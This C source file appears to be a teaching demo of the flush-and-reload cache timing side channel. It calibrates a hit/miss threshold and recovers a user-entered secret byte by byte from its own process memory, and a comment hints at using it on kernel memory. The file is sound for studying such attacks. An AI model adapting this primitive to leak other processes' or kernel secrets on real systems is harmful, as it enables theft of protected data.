/*********************************************************
  example usage of the flush-and-reload technique
  for indirectly reading the value of memory buffers 
**********************************************************/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <signal.h>




#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

#define C_based //see below for the effect of this define

char v[4096];

#define TRIALS (1<<14)
#define TRAINING_TRIALS (1000)
int BYTES_TO_LEAK = 10; //this is an inital default value

#define PAGE_SIZE 4096

#define AUDIT if(0)

char *secret_area;//the area where the string to be indirectly read is stored

char *the_array;
char *the_address;
char aux_char;


unsigned long cumulative_no_flush, cumulative_flush;
unsigned long average_no_flush, average_flush;
unsigned long threshold;
unsigned long time1, time2;
int junk = 0;


void memory_reader(){//this function prints the value of the bytes in secret_area without accessing them
	int i;
	int c;


	//now we go reading the probe array
	for(i=0;i<256;i++){

		time1 = __rdtscp( & junk);
		asm("lfence":::);
		c = the_array[i<<12];
		asm("lfence":::);
		time2 = __rdtscp( & junk);
		if( (time2 - time1) < threshold){
			if (i==0) exit(0);//string terminator found
			printf("cache hit found at array page %d \t- deduced secret char value is '0x%02x'='%c'\n",i,i,i);
			goto done;
		}
	}

	printf("no cache hit  - secret char value is still unknown\n");

done:
	
	AUDIT
	printf("scan of the probe array concluded\n");

}

void side_effect_maker(char* addr, char* attack_addr){

	// the below asm code is equivalent, in terms of side effects, to the following C code
	// select one or the other with a define

#ifdef C_BASED 
	addr[(unsigned long)(*attack_addr)<<12];
#else
	asm(
	 "movzbl (%1), %%eax\n"
	 "movsbq %%al, %%rax\n"
	 "shl $0xc, %%rax\n"
	 "add %%rbx , %%rax\n"
	 "mov (%%rax), %%rbx\n"
		:
		: "b" (addr) , "a" (attack_addr)
		:);	
#endif


}

int main (int argc, char**argv){

	int i,j;
	char c;
	int ret;


	secret_area = mmap(NULL, PAGE_SIZE, PROT_WRITE, MAP_ANONYMOUS| MAP_PRIVATE, 0 , 0);  	
	if (!secret_area){
		printf("secret area install error\n");
		return - 1;
	}

	AUDIT
	printf("secret area installed at address %u\n",secret_area);

	printf("give me the secret word: ");
	fflush(stdout);
	ret = scanf("%s",secret_area);
	if (ret == EOF){
		printf("secret word input error\n");
		return - 1;
	}

	for(i=0;i<strlen(secret_area);i++){
		printf("numerical codes for the stored characters: '0X%02x' = '%c'\n",secret_area[i],secret_area[i]);
	}

	printf("secret word safely stored\n");

	BYTES_TO_LEAK = strlen(secret_area);

	AUDIT
	printf("%s",secret_area);
	fflush(stdout);


	j = 0;

	while(1){
	
		cumulative_no_flush = 0;
		cumulative_flush = 0;

		for(i=0;i<4096;i++){
			    v[i] = 'f';
		}
	
		c = v[0];
	
		for(i=0;i<TRIALS;i++){
			time1 = __rdtscp( & junk);
			asm("lfence":::);
			c = v[0];
			asm("lfence":::);
			time2 = __rdtscp( & junk);
			cumulative_no_flush += time2 - time1;;
		}
		for(i=0;i<TRIALS;i++){
			_mm_clflush(v);
			time1 = __rdtscp( & junk);
			asm("lfence":::);
			c = v[0];
			asm("lfence":::);
			time2 = __rdtscp( & junk);
			cumulative_flush += time2 - time1;;
		}
		
		AUDIT
		printf("no flush time is %u - flush time is %u\n",cumulative_no_flush/TRIALS, cumulative_flush/TRIALS);
		average_no_flush += cumulative_no_flush/TRIALS;
		average_flush += cumulative_flush/TRIALS;

		if(++j >= TRAINING_TRIALS){
			average_no_flush = average_no_flush/TRAINING_TRIALS;
			average_flush = average_flush/TRAINING_TRIALS;

			printf("training over - average flush is %u average no flush is %u\n",average_flush, average_no_flush);
			threshold = average_no_flush + ((average_flush - average_no_flush)>>1) ; 

			printf("training over - threshold latency for cache hit/miss discrimination is %u\n",threshold);
			break;
		}

	}	


	the_array = mmap(NULL, 256* PAGE_SIZE, PROT_WRITE, MAP_ANONYMOUS| MAP_PRIVATE, 0 , 0);  	
	if (!the_array){
		printf("probe buffer install error\n");
		return - 1;
	}

	AUDIT
	printf("probe buffer is at address %u\n",the_array);

	//materializing the probe buffer in memory
	for(i=0; i< 256*PAGE_SIZE; i++){
		the_array[i] = 'f';
	}
				

	//now we actually start the attack!!
	printf("now we start the indirect memory reading attack\n");
	

	for(j=0;j<BYTES_TO_LEAK;j++){

		//preparing the attack address
		the_address = secret_area + j; 

		AUDIT
		printf("attacking at address %u\n",the_address);

		//flushing the array fromm the cache 
		for(i=0; i< 256*PAGE_SIZE; i++){
			_mm_clflush(the_array+i);
		}

		AUDIT
		printf("cache flush done\n");


		side_effect_maker(the_array,the_address);//whould be an actual fault if trying to read kernel level memory
		memory_reader();


	}


}

